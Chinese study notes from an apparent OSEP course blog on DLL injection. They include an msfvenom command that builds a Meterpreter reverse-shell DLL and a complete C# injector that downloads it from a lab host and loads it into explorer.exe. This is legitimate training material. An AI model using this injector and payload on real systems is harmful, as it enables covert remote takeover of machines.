---
title: OSEP-06-DLL注入技术
description: '06-进程注入 | 03-DLL注入技术'
pubDate: 2026-01-30T00:00:51+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# DLL 注入技术

## 概述

DLL 注入是将整个 DLL 文件加载到目标进程中执行，而不仅仅是 shellcode。

## 工作原理

```
1. 下载 DLL 到磁盘
   ↓
2. OpenProcess 打开目标进程
   ↓
3. VirtualAllocEx 分配内存
   ↓
4. WriteProcessMemory 写入 DLL 路径
   ↓
5. 获取 LoadLibraryA 地址
   ↓
6. CreateRemoteThread 调用 LoadLibraryA
   ↓
7. DLL 被加载，DllMain 执行
```

## DllMain 入口点

```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DLL 加载时执行 - 放置 shellcode
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

**关键**: shellcode 放在 `DLL_PROCESS_ATTACH` 分支中

## 生成 Meterpreter DLL

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f dll -o /var/www/html/met.dll
```

## C# DLL 注入代码

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // 1. 下载 DLL 到磁盘
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.119.120/met.dll", dllName);

            // 2. 获取目标进程
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            // 3. 打开进程
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // 4. 分配内存并写入 DLL 路径，LoadLibraryA 需要 NUL 结尾的 ANSI 字符串
            byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllName + "\0");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, dllPathBytes,
                dllPathBytes.Length, out outSize);

            // 5. 获取 LoadLibraryA 地址
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // 6. 创建远程线程调用 LoadLibraryA
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
                addr, 0, IntPtr.Zero);
        }
    }
}
```

## 关键点解析

### 为什么 LoadLibraryA 地址相同？

在很多 OSEP 实验环境里，系统 DLL（如 kernel32.dll）在同一轮启动的进程中可能加载到相同基址，因此常见教学代码会直接复用当前进程里的 `LoadLibraryA` 地址。

但在现代 Windows/ASLR 语境下，这不能当成绝对保证。更稳妥的理解是：
- 当前进程中的 `LoadLibraryA` 地址在实验环境里经常可用；
- 如果注入失败，需要确认目标进程架构、模块基址和 API 地址是否一致。

### CreateRemoteThread 参数

```csharp
CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| lpStartAddress | loadLib | LoadLibraryA 地址 |
| lpParameter | addr | DLL 路径字符串地址 |

**效果**: 相当于在目标进程中调用 `LoadLibraryA("C:\...\met.dll")`

## 限制

1. **必须写入磁盘** - LoadLibrary 只能加载磁盘上的 DLL
2. **非托管 DLL** - 只能注入 C/C++ 编写的 DLL
3. **可被检测** - DLL 会出现在进程的模块列表中

## 验证注入

使用 Process Explorer：
1. 选择 explorer.exe
2. View → Lower Pane View → DLLs
3. 查找 met.dll

## 与进程注入对比

| 方面 | 进程注入 | DLL 注入 |
|------|----------|----------|
| 写入磁盘 | 否 | 是 |
| 代码类型 | Shellcode | DLL |
| 检测难度 | 较难 | 较易 |
| 功能复杂度 | 简单 | 可以很复杂 |
